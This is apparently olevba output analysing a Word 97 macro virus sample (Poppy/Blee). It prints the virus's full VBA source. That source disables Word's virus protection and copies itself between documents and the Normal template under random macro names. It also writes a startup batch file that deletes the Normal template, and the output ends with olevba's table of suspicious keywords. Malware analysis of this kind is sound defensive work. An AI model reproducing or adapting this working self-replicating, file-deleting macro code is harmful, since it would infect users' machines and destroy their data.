olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Poppy.d-4001169d45f127296bfc94f65d1a35d58d73256e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Poppy.d-4001169d45f127296bfc94f65d1a35d58d73256e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Poppy.d-4001169d45f127296bfc94f65d1a35d58d73256e - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub Main()

'W97M/Blee.Poppy.II
'this is version II(ES) (with no blee payload)
'By VicodinES
'Macro Virus for Word 97
'"Sloppy Code For A Sloppy Red Mess"

Const Saturday As Integer = 7

Randomize

fm = Int(Rnd * 3) + 2

Mrn1 = Int(Rnd * 8) + 1
Mrn2 = Int(Rnd * 8) + 1

Brn = Int(Rnd * 100) + 1

If Mrn1 = Mrn2 Then Mrn2 = Mrn2 + 1
If Mrn2 > 8 Then Mrn2 = 0

For X = 1 To 2

If X = 1 Then MrnC = Mrn1
If X = 2 Then MrnC = Mrn2

If MrnC = 0 Then renameC$ = "HelpAbout"
If MrnC = 1 Then renameC$ = "AutoClose"
If MrnC = 2 Then renameC$ = "FileTemplates"
If MrnC = 3 Then renameC$ = "ToolsMacro"
If MrnC = 4 Then renameC$ = "AutoOpen"
If MrnC = 5 Then renameC$ = "AutoExit"
If MrnC = 6 Then renameC$ = "AutoExec"
If MrnC = 7 Then renameC$ = "ViewVBCode"
If MrnC = 8 Then renameC$ = "ToolsOptions"

If X = 1 Then rename$ = renameC$
If X = 2 Then rename1$ = renameC$

Next X

With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With

On Error Resume Next
    
    msfile$ = "c:\windows\startm~1\programs\startup\msfile.bat"

    ok = 0
    dork = 0
    
    Soma$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    nfat = GetAttr(NormalTemplate.FullName)
    
    If nfat = vbReadOnly Then Call vBitchES(msfile$)
    If nfat = vbReadOnly + vbArchive Then Call vBitchES(msfile$)
 
    If nfat = vbReadOnly Then GoTo fuckoff
    If nfat = vbReadOnly + vbArchive Then GoTo fuckoff

    If Soma$ = UCase(NormalTemplate) Then dork = 1
        
    If dork = 1 Then ao$ = WordBasic.[MacroName$](fm, 0) Else ao$ = "AutoOpen"
        
    If dork = 1 Then one$ = NormalTemplate.FullName Else one$ = ActiveDocument.FullName
        
    If dork = 1 Then two$ = ActiveDocument.FullName Else two$ = NormalTemplate.FullName
        
            If rename$ = "AutoOpen" Then backup$ = "VicodinES"
            If rename2$ = "AutoOpen" Then backup$ = "VicodinES"
            If ao$ = "AutoOpen" Then backup$ = "VicodinES"
            If backup$ <> "VicodinES" Then backup$ = "AutoOpen"

        For X = 1 To 3
        
            If X = 1 Then Mac$ = rename$
            If X = 2 Then Mac$ = rename2$
            If X = 3 Then Mac$ = backup$
            
            Application.OrganizerCopy Source:= _
        one$, Destination:= _
        two$, Name:=ao$, Object:= _
        wdOrganizerObjectProjectItems
            
            Application.OrganizerRename Source:= _
        two$, Name:=ao$, _
        NewName:=Mac$, Object:= _
        wdOrganizerObjectProjectItems

            Next X
            
            Application.OrganizerCopy Source:= _
        one$, Destination:= _
        two$, Name:=ao$, Object:= _
        wdOrganizerObjectProjectItems
        
        If dork = 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate
        If dork = 0 Then
            If NormalTemplate.Saved = False Then NormalTemplate.Save
            
        End If
    
Today = WeekDay(Now())

If Today = Saturday Then MsgBox "VicodinES is probably high on painkillers right now"

With Dialogs(wdDialogFileSummaryInfo)
    .Author = "VicodinES"
    .Title = "Another W97M/Blee.Poppy Infected Document"
    .Subject = "Macro Virus Infection by The Narkotic Network"
    .Comments = "Hello from VicodinES and The Narkotic Network ... we mean you no harm"
    .Execute
End With

    
    
    With ActiveDocument
        .ReadOnlyRecommended = False
        .Password = ""
        .WritePassword = ""
    End With

GoTo fuckoff

Hell:
        
fuckoff:
    On Error GoTo -1: On Error GoTo 0

End Sub
Sub vBitchES(strFile As String)
 
 Dim hFile As Long

 n$ = NormalTemplate
 Part1$ = "@echo off"
 Part11$ = "attrib -h -r "
 snag$ = "c:\progra~1\micros~1\templa~1\"
 snag1$ = "c:\progra~1\micros~2\templa~1\"
 Part2$ = "del "
 Part33$ = "cls"
 
     hFile = FreeFile
     Open strFile For Output Access Write As hFile
     Print #hFile, Part1$
     Print #hFile, Part11$ + snag$ + n$
     Print #hFile, Part11$ + snag1$ + n$
     Print #hFile, Part2$ + snag$ + n$
     Print #hFile, Part2$ + snag1$ + n$
     Print #hFile, Part33$
     Print #hFile, Part2$ + msfile$
     Close hFile
     
     GoTo Hell
     
Hell:

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |msfile.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

